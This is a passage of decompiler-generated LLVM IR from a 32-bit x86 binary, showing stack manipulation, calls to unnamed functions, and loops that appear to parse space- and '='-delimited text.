  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8051d50()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_8051da0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge6, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8051d50()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_8054b69.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8051d50()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp143, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_8054b69.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8051d50()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp144, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
